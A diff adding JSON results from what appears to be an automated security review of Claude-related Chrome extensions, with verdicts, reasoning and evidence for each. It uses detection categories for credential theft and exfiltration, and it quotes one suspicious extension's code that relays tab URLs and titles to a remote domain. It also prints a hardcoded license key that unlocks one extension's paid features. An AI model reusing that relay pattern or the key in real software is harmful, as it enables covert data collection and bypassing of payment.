+      "pattern_assessment": [
+        {
+          "pattern": "MUTATION_OBSERVER",
+          "usage": "LEGITIMATE",
+          "justification": "Used in content.js to detect when new elements (like new chat messages or UI components) are added to the DOM so they can be translated in real-time."
+        },
+        {
+          "pattern": "STORAGE / CHROME_STORAGE",
+          "usage": "LEGITIMATE",
+          "justification": "Used in both popup.js and content.js to store and retrieve the user's preference for whether translation is enabled."
+        },
+        {
+          "pattern": "TABS_ACCESS",
+          "usage": "LEGITIMATE",
+          "justification": "Used in popup.js to identify the active Claude.ai tab and send a message to the content script when the user toggles the translation switch."
+        },
+        {
+          "pattern": "DOM",
+          "usage": "LEGITIMATE",
+          "justification": "Used extensively in content.js to traverse text nodes (using TreeWalker) and modify attributes like 'placeholder' and 'title' for translation purposes."
+        }
+      ],
+      "token_usage": {
+        "prompt": 5976,
+        "candidates": 644,
+        "total": 7276
+      }
+    },
+    {
+      "extension_id": "npchaaconkaeabodpfagndjbepmnkckk",
+      "verdict": "SAFE",
+      "confidence": 1.0,
+      "reasoning": "The extension is entirely functional and focused on its stated purpose. Analysis of the source code confirms that chat data is extracted from the DOM, cleaned, and processed locally into a PDF using the PDFLib and html2pdf libraries. There are no network calls (fetch/XHR) present in the code that would indicate data exfiltration. The 'password' detection is a false positive related to a simple local license check for unlocking 'PRO' features (removing watermarks). No malicious behaviors or dual-purpose functions were identified.",
+      "recommendation": "ALLOW",
+      "key_concerns": [],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": null,
+          "processing_method": null,
+          "destination_domain": null,
+          "code_evidence": null
+        },
+        "dual_purpose": {
+          "stated_purpose": "Export Claude conversations to PDF with selective questions and answers.",
+          "hidden_functionality": null,
+          "code_evidence": null
+        },
+        "credential_theft": {
+          "capture_mechanism": null,
+          "transmission_target": null,
+          "code_evidence": null
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "https://clients2.google.com/service/update2/crx"
+        ],
+        "requires_investigation": [],
+        "informational_only": [
+          "https://claude.ai/*"
+        ]
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "STORAGE",
+          "usage": "LEGITIMATE",
+          "justification": "Used to track the number of PDFs generated and the 'isUnlocked' status for the extension's local freemium model."
+        },
+        {
+          "pattern": "INNERHTML",
+          "usage": "LEGITIMATE",
+          "justification": "Used to sanitize and clean Claude's UI elements from the extracted conversation before rendering the PDF."
+        },
+        {
+          "pattern": "CREDENTIAL_ACCESS / PASSWORD_SELECTOR",
+          "usage": "LEGITIMATE",
+          "justification": "Static analysis flagged the ID 'password'. This is a local input field for the user to enter a hardcoded license key ('CLD8830417') to unlock the extension's PRO features, not for stealing credentials."
+        },
+        {
+          "pattern": "BLOB_URL",
+          "usage": "LEGITIMATE",
+          "justification": "Used to create a local URL for the generated PDF blob so the user can download it."
+        }
+      ],
+      "token_usage": {
+        "prompt": 8676,
+        "candidates": 644,
+        "total": 10060
+      }
+    },
+    {
+      "extension_id": "gpaapejfeeglombnfcjadmepalhaflmh",
+      "verdict": "SAFE",
+      "confidence": 1.0,
+      "reasoning": "The analysis of the source code confirms that 'Claude Assistant' is a legitimate AI tool. It collects page content (text, meta, links) exclusively to provide context to the Anthropic API. The network activity is restricted to the official Anthropic domain. The 'pseudo-encryption' found in crypto-utils.js is a benign security feature intended to prevent the API key from being stored in plain text. No evidence of data exfiltration to third-party servers, credential harvesting, or hidden monetization (ads/tracking) was found. The permissions requested (activeTab, storage, scripting) are proportional to its features.",
+      "recommendation": "ALLOW",
+      "key_concerns": [],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": "Page metadata (URL, title), page text, and user-provided API keys.",
+          "processing_method": "Data is bundled into a system prompt for the Claude AI model.",
+          "destination_domain": "api.anthropic.com",
+          "code_evidence": "const response = await fetch('https://api.anthropic.com/v1/messages', { method: 'POST', headers: { 'x-api-key': apiKey ... }, body: JSON.stringify(requestBody) });"
+        },
+        "dual_purpose": {
+          "stated_purpose": "AI/ChatGPT assistant to analyze web pages.",
+          "hidden_functionality": null,
+          "code_evidence": null
+        },
+        "credential_theft": {
+          "capture_mechanism": "Users manually enter their Anthropic API key into the settings panel.",
+          "transmission_target": "Sent only to the official Anthropic API endpoint via secure HTTPS.",
+          "code_evidence": "ANTHROPIC_API_KEY = request.settings.apiKey || '';"
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "api.anthropic.com",
+          "github.com",
+          "clients2.google.com"
+        ],
+        "requires_investigation": [],
+        "informational_only": []
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "FETCH",
+          "usage": "LEGITIMATE",
+          "justification": "Used to communicate with the Anthropic API to generate AI responses as per the extension's core functionality."
+        },
+        {
+          "pattern": "KEYBOARD_LISTENER",
+          "usage": "LEGITIMATE",
+          "justification": "Used in the popup and tab views to detect the 'Enter' key press for sending chat messages."
+        },
+        {
+          "pattern": "STORAGE",
+          "usage": "LEGITIMATE",
+          "justification": "Used to store extension settings, chat history (domain-specific), and the user's API key."
+        },
+        {
+          "pattern": "SECURITY_RISK",
+          "usage": "LEGITIMATE",
+          "justification": "Static analysis flagged simple XOR encryption in crypto-utils.js. This is a benign attempt to obscure the API key in local storage, not a malicious interception."
+        },
+        {
+          "pattern": "INNERHTML",
+          "usage": "LEGITIMATE",
+          "justification": "Used to render Markdown-formatted responses from the AI and localized strings from the extension's own locale files."
+        }
+      ],
+      "token_usage": {
+        "prompt": 23057,
+        "candidates": 816,
+        "total": 24926
+      }
+    },
+    {
+      "extension_id": "aodeelojpoccdclhkjflkjgbbjhkjoie",
+      "verdict": "SAFE",
+      "confidence": 0.95,
+      "reasoning": "The extension is a standard 'Bring Your Own AI' assistant. The code analysis confirms that the data collection (text selection) is strictly for the purpose of sending that text to AI providers as requested by the user through the UI (Summarize, Explain, etc.). The storage of API keys and the presence of keyboard listeners for shortcuts are standard requirements for this type of functionality. There is no evidence of unauthorized data exfiltration, ad injection, or credential theft. The 'suspicious' URLs identified by static analysis are actually help links in the onboarding/settings UI to assist users in finding their own API keys.",
+      "recommendation": "ALLOW",
+      "key_concerns": [],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": "Selected text on web pages and page URLs.",
+          "processing_method": "Text is captured via window.getSelection() and sent to AI models for processing (summarization, translation, etc.)",
+          "destination_domain": "api.highlightx.ai, api.openai.com, api.anthropic.com, api.deepseek.com, and localhost (Ollama).",
+          "code_evidence": "In Dbrcl4XW.js, the 'Ln' function captures window.getSelection().toString() and passes it to the 'f' (chat) function, which sends it to the configured AI provider."
+        },
+        "dual_purpose": {
+          "stated_purpose": "AI chat assistant connecting to various local and cloud-based AI models.",
+          "hidden_functionality": null,
+          "code_evidence": null
+        },
+        "credential_theft": {
+          "capture_mechanism": "Users are directed via links to retrieve their own API keys from official provider dashboards and enter them into the extension settings for local storage.",
+          "transmission_target": null,
+          "code_evidence": "Static findings for URLs like 'https://platform.openai.com/account/api-keys' are found within UI components as help links for users."
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "api.highlightx.ai",
+          "api.openai.com",
+          "api.anthropic.com",
+          "api.deepseek.com",
+          "generativelanguage.googleapis.com",
+          "google-analytics.com",
+          "localhost"
+        ],
+        "requires_investigation": [],
+        "informational_only": [
+          "github.com",
+          "w3.org",
+          "npmjs.com",
+          "reactjs.org"
+        ]
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "KEYBOARD_LISTENER",
+          "usage": "LEGITIMATE",
+          "justification": "Used to implement the Command+H / Ctrl+H shortcut to activate the extension as defined in the manifest commands."
+        },
+        {
+          "pattern": "CHROME_STORAGE",
+          "usage": "LEGITIMATE",
+          "justification": "Used to persist user settings, chat history, and user-provided API keys for AI services."
+        },
+        {
+          "pattern": "INNERHTML",
+          "usage": "LEGITIMATE",
+          "justification": "Used by the UI/Markdown rendering libraries (likely react-markdown) to display AI-generated content."
+        },
+        {
+          "pattern": "NETWORK_ENDPOINT (Localhost)",
+          "usage": "LEGITIMATE",
+          "justification": "Necessary for the extension to communicate with locally hosted AI models like Ollama (port 11434)."
+        }
+      ],
+      "token_usage": {
+        "prompt": 102916,
+        "candidates": 867,
+        "total": 104888
+      }
+    },
+    {
+      "extension_id": "egddooecigfdpecpkdpklmejabiionep",
+      "verdict": "SAFE",
+      "confidence": 0.95,
+      "reasoning": "The extension's code aligns perfectly with its stated purpose. The primary 'interception' logic found in `background.iife.js` is specifically designed to detect Claude's internal message endpoints (`rendering_mode=messages` and `chat_conversations`). It saves these URLs to local storage, presumably so the side panel can fetch and export the data. There is no evidence of data being sent to any external server other than Claude.ai. The static analysis findings for DOM manipulation and script execution are standard for extensions built using the React/Vite boilerplate referenced in the code.",
+      "recommendation": "ALLOW",
+      "key_concerns": [],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": null,
+          "processing_method": null,
+          "destination_domain": null,
+          "code_evidence": null
+        },
+        "dual_purpose": {
+          "stated_purpose": "Claude Magic Export / AI assistant for exporting Claude conversations",
+          "hidden_functionality": null,
+          "code_evidence": null
+        },
+        "credential_theft": {
+          "capture_mechanism": null,
+          "transmission_target": null,
+          "code_evidence": null
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "https://claude.ai"
+        ],
+        "requires_investigation": [],
+        "informational_only": [
+          "https://reactjs.org",
+          "https://github.com/Jonghakseo/chrome-extension-boilerplate-react-vite"
+        ]
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "FETCH_HIJACK",
+          "usage": "LEGITIMATE",
+          "justification": "The extension intercepts fetch requests in the MAIN world to capture the URLs of Claude.ai's message and session data streams. This is a common and necessary technique for 'export' extensions to access structured data that isn't available through a public API."
+        },
+        {
+          "pattern": "STORAGE",
+          "usage": "LEGITIMATE",
+          "justification": "Used to store captured API URLs and user preferences (like theme) locally within the extension context."
+        },
+        {
+          "pattern": "INNERHTML",
+          "usage": "LEGITIMATE",
+          "justification": "These are standard artifacts of the React framework used to build the extension's UI (side panel)."
+        },
+        {
+          "pattern": "NEW_FUNCTION",
+          "usage": "LEGITIMATE",
+          "justification": "Found within the minified React/Vite production bundle; typical for utility functions or framework-level logic in modern web builds."
+        }
+      ],
+      "token_usage": {
+        "prompt": 304206,
+        "candidates": 679,
+        "total": 305841
+      }
+    },
+    {
+      "extension_id": "ndeejgokieklaealoikgdmbmjdkmaoco",
+      "verdict": "SAFE",
+      "confidence": 1.0,
+      "reasoning": "The extension's code aligns perfectly with its stated purpose. Analysis of background.js confirms that network requests are only sent to the official Anthropic API (api.anthropic.com). The 'anthropic-dangerous-direct-browser-access' header is a known requirement for client-side implementations using Anthropic's API. No evidence was found of data exfiltration, dual-purpose code, or credential theft. The API key is stored securely within the browser's storage and is only transmitted to the authorized service provider.",
+      "recommendation": "ALLOW",
+      "key_concerns": [],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": null,
+          "processing_method": null,
+          "destination_domain": null,
+          "code_evidence": null
+        },
+        "dual_purpose": {
+          "stated_purpose": "Translate or summarize selected text using Claude API.",
+          "hidden_functionality": null,
+          "code_evidence": null
+        },
+        "credential_theft": {
+          "capture_mechanism": null,
+          "transmission_target": null,
+          "code_evidence": null
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "https://api.anthropic.com/v1/messages",
+          "https://clients2.google.com/service/update2/crx"
+        ],
+        "requires_investigation": [],
+        "informational_only": []
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "STORAGE",
+          "usage": "LEGITIMATE",
+          "justification": "Used to store the user's Anthropic API key and preferred translation language/model locally using chrome.storage.sync."
+        },
+        {
+          "pattern": "FETCH",
+          "usage": "LEGITIMATE",
+          "justification": "Used in background.js to communicate directly with the official Anthropic API endpoint for processing text."
+        },
+        {
+          "pattern": "INNERHTML",
+          "usage": "LEGITIMATE",
+          "justification": "Used in content.js to construct the UI overlay (loading spinners and buttons). The content injected is static HTML or sanitized text from the AI response."
+        },
+        {
+          "pattern": "TABS_ACCESS",
+          "usage": "LEGITIMATE",
+          "justification": "Required to execute the translation/summary functions on the active tab when triggered via context menu or keyboard shortcuts."
+        }
+      ],
+      "token_usage": {
+        "prompt": 8958,
+        "candidates": 633,
+        "total": 10544
+      }
+    },
+    {
+      "extension_id": "madhogacekcffodccklcahghccobigof",
+      "verdict": "SAFE",
+      "confidence": 1.0,
+      "reasoning": "After a thorough review of the provided source code, the extension appears to be entirely legitimate. All network activity is restricted to the 'claude.ai' domain for the purpose of fetching usage statistics. The data collection (chat scraping) is used specifically for the user-triggered 'export' functionality, which converts the DOM elements into a Markdown file for local download. There is no evidence of data exfiltration to any third-party servers. The 'supportStats' logic in sidebar-usage.js and popup.js is a standard mechanism to occasionally prompt users for reviews or donations (Buy Me a Coffee), which is common and benign for independent extensions. The code is well-structured, uses descriptive variable names, and follows standard extension development patterns without any obfuscation.",
+      "recommendation": "ALLOW",
+      "key_concerns": [],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": null,
+          "processing_method": null,
+          "destination_domain": null,
+          "code_evidence": null
+        },
+        "dual_purpose": {
+          "stated_purpose": "Track Claude usage, export conversations to Markdown, and jump into new chats instantly.",
+          "hidden_functionality": null,
+          "code_evidence": null
+        },
+        "credential_theft": {
+          "capture_mechanism": null,
+          "transmission_target": null,
+          "code_evidence": null
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "https://claude.ai"
+        ],
+        "requires_investigation": [],
+        "informational_only": [
+          "https://clients2.google.com/service/update2/crx"
+        ]
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "NETWORK_ENDPOINT",
+          "usage": "LEGITIMATE",
+          "justification": "The endpoints targeted (claude.ai/api/organizations and /usage) are necessary to fetch the user's specific usage metrics as per the extension's primary purpose."
+        },
+        {
+          "pattern": "MUTATION_OBSERVER",
+          "usage": "LEGITIMATE",
+          "justification": "Used in content.js to detect when new messages appear in the chat interface so the export tool can stay updated with the current conversation state."
+        },
+        {
+          "pattern": "STORAGE",
+          "usage": "LEGITIMATE",
+          "justification": "Used to cache usage percentages locally and save user preferences for the UI (e.g., whether the sidebar is minimized)."
+        },
+        {
+          "pattern": "INNERHTML",
+          "usage": "LEGITIMATE",
+          "justification": "Used in sidebar-usage.js to inject and update the custom usage tracking UI elements into the Claude sidebar."
+        },
+        {
+          "pattern": "FETCH",
+          "usage": "LEGITIMATE",
+          "justification": "Used in background.js to pull data from Claude's authenticated API. These requests include credentials to act on the user's behalf within the claude.ai domain."
+        }
+      ],
+      "token_usage": {
+        "prompt": 28909,
+        "candidates": 766,
+        "total": 30552
+      }
+    },
+    {
+      "extension_id": "niccnmfnkokileojoalgiinemlekmfoa",
+      "verdict": "SUSPICIOUS",
+      "confidence": 0.9,
+      "reasoning": "The extension is classified as SUSPICIOUS primarily due to trademark impersonation and the collection of browsing context. It claims to be an official 'Claude 3.5 Sonnet' extension (using Anthropic's branding) but is actually a wrapper for 'ext-access.pro'. It contains a significant amount of code for a third-party paywall system ('onlineapp.pro') which is not disclosed in its primary purpose. Most importantly, 'extension-bridge.js' allows the remote origin to request the user's current URL and page title, which is then exfiltrated to the developer's server. While not explicitly stealing credentials, the deceptive branding combined with context harvesting and a third-party billing engine are high-risk indicators of 'grayware' or a potentially unwanted application.",
+      "recommendation": "REVIEW",
+      "key_concerns": [
+        "Impersonation of Claude 3.5 Sonnet (Anthropic branding).",
+        "Exfiltration of active tab URL and title to ext-access.pro.",
+        "Integration of a complex, third-party paywall system (onlineapp.pro) unrelated to the stated AI model.",
+        "Security risk: The extension-to-iframe bridge allows the remote server to read extension storage and browser metadata."
+      ],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": "Active tab URL and Title",
+          "processing_method": "Captured via background script and passed to a remote iframe through postMessage",
+          "destination_domain": "https://ext-access.pro",
+          "code_evidence": "chrome.runtime.sendMessage({action: 'getActiveTabInfo'}, function(response) { iframeElement.contentWindow.postMessage({ type: 'ACTIVE_TAB_INFO_RESPONSE', data: response, ... }, event.origin); });"
+        },
+        "dual_purpose": {
+          "stated_purpose": "Claude 3.5 Sonnet AI Assistant",
+          "hidden_functionality": "Impersonates a major AI brand (Anthropic's Claude) while acting as a wrapper for a third-party domain (ext-access.pro) with a separate paywall infrastructure (onlineapp.pro).",
+          "code_evidence": "window.paywall = { ... _createAndAppendIframe: function() { e.src = 'https://onlineapp.pro/paywall/'.concat(this.paywallId, '?v=2') } }"
+        },
+        "credential_theft": {
+          "capture_mechanism": null,
+          "transmission_target": null,
+          "code_evidence": null
+        }
+      },
+      "domains": {
+        "legitimate": [],
+        "requires_investigation": [
+          "https://ext-access.pro",
+          "https://onlineapp.pro",
+          "https://onlineapp.live",
+          "https://onlineapp.stream"
+        ],
+        "informational_only": [
+          "http://127.0.0.1:8000"
+        ]
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "TABS_ACCESS",
+          "usage": "SUSPICIOUS",
+          "justification": "The extension captures the active tab's URL and title and sends it to the remote domain ext-access.pro. While common for AI context, doing so under the guise of an official 'Claude' extension (impersonation) is a privacy risk."
+        },
+        {
+          "pattern": "INNERHTML",
+          "usage": "LEGITIMATE",
+          "justification": "Used in action-buttons.js to dynamically render UI elements for the chat characters/prompts."
+        },
+        {
+          "pattern": "POST_MESSAGE",
+          "usage": "SUSPICIOUS",
+          "justification": "Creates a bridge that allows a remote website (ext-access.pro) to query extension storage and browser tab information, effectively bypassing some extension isolation boundaries."
+        }
+      ],
+      "token_usage": {
+        "prompt": 11827,
+        "candidates": 950,
+        "total": 16170
+      }
+    },
+    {
+      "extension_id": "ncjafpbbndpggfhfgjngkcimeaciahpo",
+      "verdict": "SAFE",
+      "confidence": 1.0,
+      "reasoning": "The extension is a straightforward UI enhancement tool for Claude.ai. Analysis of the content.js file shows it is a standard production build (Webpack) that includes Tailwind CSS for styling. The core logic involves using a MutationObserver to watch the DOM for specific selectors associated with Claude's 'thinking' or code blocks. Once detected, it adds a toggle mechanism (expanded/collapsed) and a custom copy-to-clipboard button. There is no evidence of data exfiltration, external network calls, or unauthorized data collection. The permissions requested in the manifest are minimal (storage only).",
+      "recommendation": "ALLOW",
+      "key_concerns": [],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": null,
+          "processing_method": null,
+          "destination_domain": null,
+          "code_evidence": null
+        },
+        "dual_purpose": {
+          "stated_purpose": "Chrome extension for letting Claude think like a real human",
+          "hidden_functionality": null,
+          "code_evidence": null
+        },
+        "credential_theft": {
+          "capture_mechanism": null,
+          "transmission_target": null,
+          "code_evidence": null
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "https://claude.ai"
+        ],
+        "requires_investigation": [],
+        "informational_only": [
+          "https://tailwindcss.com"
+        ]
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "MUTATION_OBSERVER",
+          "usage": "LEGITIMATE",
+          "justification": "The extension uses a MutationObserver to detect when Claude generates new message blocks so it can apply UI enhancements (collapsible thinking blocks) in real-time."
+        },
+        {
+          "pattern": "INNERHTML",
+          "usage": "LEGITIMATE",
+          "justification": "Used to update the UI of the 'Copy' button (specifically swapping the icon and text to 'Copied') after a user clicks the button."
+        },
+        {
+          "pattern": "NETWORK_ENDPOINT",
+          "usage": "LEGITIMATE",
+          "justification": "The 'https://claude.ai/chat/' string is used only to verify that the current URL is a valid chat page before initializing the extension's UI logic. No network requests are made to this or any other domain."
+        }
+      ],
+      "token_usage": {
+        "prompt": 11041,
+        "candidates": 617,
+        "total": 12570
+      }
+    },
+    {
+      "extension_id": "oeamjflagfpbajcdahjgfbgalcfmijic",
+      "verdict": "SAFE",
+      "confidence": 0.95,
+      "reasoning": "The analysis of the extension's source code shows it is a legitimate productivity tool. The 'superclaude-db.js' file is a bundled version of Dexie.js (an IndexedDB library), and the 'popup' and 'sidebar' files are bundled React applications. The static analysis findings are almost entirely artifacts of these frameworks. The background script legitimately handles license validation and captures organization IDs from Claude.ai requests to provide its stated functionality (folders and chat structure). There is no evidence of unauthorized data collection, credential theft, or hidden malicious features. All network activity is directed to the target site (Claude) or the developer's licensing backend.",
+      "recommendation": "ALLOW",
+      "key_concerns": [],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": null,
+          "processing_method": null,
+          "destination_domain": null,
+          "code_evidence": null
+        },
+        "dual_purpose": {
+          "stated_purpose": "Add folders and structure chats, ask quick questions, export chat and more to Claude",
+          "hidden_functionality": null,
+          "code_evidence": null
+        },
+        "credential_theft": {
+          "capture_mechanism": null,
+          "transmission_target": null,
+          "code_evidence": null
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "https://app.superclaude.xyz",
+          "https://claude.ai",
+          "https://www.superclaude.xyz",
+          "https://forms.gle"
+        ],
+        "requires_investigation": [],
+        "informational_only": [
+          "http://www.w3.org/2000/svg",
+          "http://www.w3.org/1998/Math/MathML",
+          "https://react.dev/errors/",
+          "http://www.w3.org/1999/xlink",
+          "http://www.w3.org/XML/1998/namespace"
+        ]
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "DYNAMIC_SCRIPT",
+          "usage": "LEGITIMATE",
+          "justification": "The dynamic script logic in popup-CAIfCAbK.js is a standard polyfill for modulepreload and code-splitting common in modern React applications built with Vite or Rollup."
+        },
+        {
+          "pattern": "WEB_REQUEST",
+          "usage": "LEGITIMATE",
+          "justification": "The extension uses webRequest to monitor Claude API calls specifically to capture the organization ID (currOrgId), which is necessary for context-aware chat organization as per the stated purpose."
+        },
+        {
+          "pattern": "INNERHTML",
+          "usage": "LEGITIMATE",
+          "justification": "Used within the bundled React framework code for rendering UI components."
+        },
+        {
+          "pattern": "FETCH",
+          "usage": "LEGITIMATE",
+          "justification": "Used for license validation ('/validate') and activation ('/activate') against the developer's official domain (app.superclaude.xyz)."
+        },
+        {
+          "pattern": "KEYBOARD_LISTENER",
+          "usage": "LEGITIMATE",
+          "justification": "Standard keyboard shortcuts/UI interaction handling in a complex AI assistant interface."
+        }
+      ],
+      "token_usage": {
+        "prompt": 114589,
+        "candidates": 834,
+        "total": 116583
+      }
+    },
+    {
+      "extension_id": "niicpkfpebcmikhdmmjnlamoljlabkni",
+      "verdict": "SAFE",
+      "confidence": 0.95,
+      "reasoning": "The extension is a legitimate utility for exporting user data from Claude.ai. Technical analysis confirms that all network activity (FETCH) is restricted to the claude.ai domain. The data flow is strictly 'Claude API -> Extension Processing -> User Download'. There is no evidence of data exfiltration to third-party servers, hidden monetization, or credential harvesting. The JSZip library included is the standard minified production build of a popular open-source project. The permissions requested (storage, scripting, activeTab) are appropriate for the stated functionality.",
+      "recommendation": "ALLOW",
+      "key_concerns": [],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": null,
+          "processing_method": null,
+          "destination_domain": null,
+          "code_evidence": null
+        },
+        "dual_purpose": {
+          "stated_purpose": "Export conversations and artifacts from Claude.ai",
+          "hidden_functionality": null,
+          "code_evidence": null
+        },
+        "credential_theft": {
+          "capture_mechanism": null,
+          "transmission_target": null,
+          "code_evidence": null
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "https://claude.ai/*",
+          "https://clients2.google.com/service/update2/crx"
+        ],
+        "requires_investigation": [],
+        "informational_only": [
+          "http://stuartk.com/jszip",
+          "https://raw.github.com/Stuk/jszip/main/LICENSE.markdown",
+          "https://github.com/nodeca/pako/blob/main/LICENSE"
+        ]
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "FETCH",
+          "usage": "LEGITIMATE",
+          "justification": "Used in content.js and options.js to retrieve conversation data directly from the official Claude.ai API for export purposes."
+        },
+        {
+          "pattern": "BLOB_URL",
+          "usage": "LEGITIMATE",
+          "justification": "Used in utils.js and browse.js to create local download links for the generated Markdown, JSON, or ZIP files."
+        },
+        {
+          "pattern": "INNERHTML",
+          "usage": "LEGITIMATE",
+          "justification": "Used in browse.js to render the conversation list UI. The code includes an escapeHtml helper to mitigate XSS risks."
+        },
+        {
+          "pattern": "CHROME_STORAGE",
+          "usage": "LEGITIMATE",
+          "justification": "Used to persist the user's Claude Organization ID locally, which is required for API authentication."
+        },
+        {
+          "pattern": "TABS_ACCESS",
+          "usage": "LEGITIMATE",
+          "justification": "Used to identify the current conversation ID from the URL and to inject content scripts into existing Claude.ai tabs."
+        }
+      ],
+      "token_usage": {
+        "prompt": 61041,
+        "candidates": 732,
+        "total": 63196
+      }
+    },
+    {
+      "extension_id": "jgpggmhmhogiianihdlofmgcaifklehl",
+      "verdict": "SAFE",
+      "confidence": 0.95,
+      "reasoning": "The extension is a standard productivity tool for Claude.ai. The static analysis flagged several 'suspicious' patterns that are actually artifacts of the React framework and the Dexie.js database library. The use of the 'cookies' permission and host permissions for 'claude.ai' is technically necessary for the extension to sync conversation data and manage artifacts. No evidence of data being sent to any third-party or developer-controlled domains was found. The code is structured as a standard modern React application using the Plasmo framework.",
+      "recommendation": "ALLOW",
+      "key_concerns": [],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": "Claude conversation data and messages are synced to a local IndexedDB.",
+          "processing_method": "Uses the Dexie.js library to manage a local database named 'super-claude-db'.",
+          "destination_domain": "https://claude.ai",
+          "code_evidence": "Line 5027 in index.js: 'https://claude.ai/api'; Line 41 in index.js: 'super-claude-db'. Messaging handlers like 'syncClaude' and 'getConversations' interact with the local database and the official Claude API."
+        },
+        "dual_purpose": {
+          "stated_purpose": "All-in-one toolbox to enhance Claude with super powers!",
+          "hidden_functionality": null,
+          "code_evidence": null
+        },
+        "credential_theft": {
+          "capture_mechanism": null,
+          "transmission_target": null,
+          "code_evidence": "The extension uses the 'cookies' permission (Line 5007) to access session information for Claude.ai, which is a legitimate requirement for an extension designed to interface with Claude's private API to perform sync and organizational tasks."
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "https://claude.ai",
+          "https://reactjs.org",
+          "http://www.w3.org"
+        ],
+        "requires_investigation": [],
+        "informational_only": [
+          "http://www.w3.org/1999/xlink",
+          "http://www.w3.org/2000/svg",
+          "http://www.w3.org/1998/Math/MathML"
+        ]
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "CHROME_COOKIES / CREDENTIAL_ACCESS",
+          "usage": "LEGITIMATE",
+          "justification": "Used to retrieve session tokens from claude.ai so the extension can fetch the user's chat history and artifacts as part of its stated sync functionality."
+        },
+        {
+          "pattern": "NETWORK_ENDPOINT (w3.org / reactjs.org)",
+          "usage": "LEGITIMATE",
+          "justification": "These are standard XML namespaces for SVGs/HTML and the React framework's error decoder. They are not used for network communication."
+        },
+        {
+          "pattern": "MUTATION_OBSERVER",
+          "usage": "LEGITIMATE",
+          "justification": "Used in the content script to detect when the Claude interface updates (e.g., new messages or page navigation) to inject its toolbox features."
+        },
+        {
+          "pattern": "STORAGE / DEXIE",
+          "usage": "LEGITIMATE",
+          "justification": "The extension implements a sophisticated local caching system for chat data using the Dexie IndexedDB library."
+        }
+      ],
+      "token_usage": {
+        "prompt": 105797,
+        "candidates": 873,
+        "total": 107769
+      }
+    },
+    {
+      "extension_id": "iimjloenddcpaddfdigacfegicopfdkg",
+      "verdict": "SAFE",
+      "confidence": 0.95,
+      "reasoning": "The analysis of the provided source code confirms the extension is a legitimate productivity tool for Claude.ai. The 'Keyboard Listener' patterns are tied to documented Vim-like navigation features. The DOM manipulation (innerHTML/MutationObserver) is used to integrate the extension's settings and shortcut lists into the native Claude.ai user interface. All external domains identified (GitHub, Google Forms, BuyMeACoffee) are standard for open-source extension development and user feedback. There is no evidence of data exfiltration or credential harvesting; host permissions are correctly restricted to the target domain (claude.ai).",
+      "recommendation": "ALLOW",
+      "key_concerns": [],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": null,
+          "processing_method": null,
+          "destination_domain": null,
+          "code_evidence": null
+        },
+        "dual_purpose": {
+          "stated_purpose": "AI/ChatGPT assistant providing keyboard shortcuts and UI enhancements for Claude.ai",
+          "hidden_functionality": null,
+          "code_evidence": null
+        },
+        "credential_theft": {
+          "capture_mechanism": null,
+          "transmission_target": null,
+          "code_evidence": null
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "https://claude.ai/*",
+          "https://github.com/gakkunn/Ex-Chrome-Claude",
+          "https://buymeacoffee.com/gakkunn"
+        ],
+        "requires_investigation": [],
+        "informational_only": [
+          "http://www.w3.org/2000/svg",
+          "http://www.w3.org/1999/xhtml",
+          "http://www.w3.org/1998/Math/MathML",
+          "https://docs.google.com/forms/d/e/1FAIpQLScTb5N21gzjuGKWrSeoNwy7HZdcSmU9kKJGnJ-P"
+        ]
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "KEYBOARD_LISTENER",
+          "usage": "LEGITIMATE",
+          "justification": "The extension implements Vim-style navigation (j, k, gg, G) and custom keyboard shortcuts to interact with the Claude.ai interface."
+        },
+        {
+          "pattern": "DYNAMIC_SCRIPT",
+          "usage": "LEGITIMATE",
+          "justification": "The extension uses standard Vite/Rollup loading patterns where a small loader script imports the main logic via chrome.runtime.getURL."
+        },
+        {
+          "pattern": "INNERHTML",
+          "usage": "LEGITIMATE",
+          "justification": "Used in index.js (Line 680) and Ht class to inject a custom 'Extension' section into the existing Claude keyboard shortcuts dialog for user visibility."
+        },
+        {
+          "pattern": "POST_MESSAGE",
+          "usage": "LEGITIMATE",
+          "justification": "Used for inter-script communication to synchronize settings and internationalization data between the popup/content scripts and the injected page context."
+        }
+      ],
+      "token_usage": {
+        "prompt": 13883,
+        "candidates": 796,
+        "total": 15732
+      }
+    },
+    {
+      "extension_id": "jjghfaljgailnbndlmdccfbofdkhenap",
+      "verdict": "SAFE",
+      "confidence": 1.0,
+      "reasoning": "The extension is a single-purpose tool that functions exactly as described in the manifest. It uses standard DOM manipulation techniques (querySelectorAll, remove(), MutationObserver) to hide a specific disclaimer link on the Claude.ai website. The 'Network Endpoint' flagged by static analysis is simply the href value of the link being targeted for removal, not a destination for exfiltrated data. There is no evidence of data collection, network transmission, or hidden functionality.",
+      "recommendation": "ALLOW",
